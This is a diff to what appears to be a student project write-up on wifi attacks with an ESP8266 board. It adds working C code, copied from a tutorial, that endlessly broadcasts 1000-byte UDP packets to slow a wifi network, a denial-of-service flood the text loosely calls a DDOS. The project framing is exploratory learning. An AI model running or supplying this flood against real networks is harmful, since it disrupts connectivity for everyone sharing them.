@@ -55,8 +55,31 @@ tmr.alarm(0, 6000, 1, function()
 end )
 ```
 
+We looked for another type of wifi attack. We found a [tutorial](https://yoursunny.com/t/2016/WiFi-flood/) to slow down the speed of a wifi connection. In this tutorial we found a code which create many network packets, then send them to a router. Each packet contain 1000 byte. This method is called a DDOS.
 
-We looked for other type of wifi attack. We found a way to slow down the speed of a wifi connection.
+This is the code we found in the tutorial:
+```C
+#include <ESP8266WiFi.h>
+#include <WiFiUdp.h>
+
+uint8_t pkt[1000];
+
+void setup() {
+  Serial.begin(115200);
+
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP("00000000", "00000000", 6, 1);
+
+  memset(pkt, 0, sizeof(pkt));
+}
+
+void loop() {
+  WiFiUDP udp;
+  udp.beginPacketMulticast(WiFi.softAPIP(), 1, IPAddress(255,255,255,255), 1);
+  udp.write(pkt, sizeof(pkt));
+  udp.endPacket();
+}
+```
 
 So we developed a code to connect to a router. 
 This code contained an interface to connect to a wifi access point via an form.
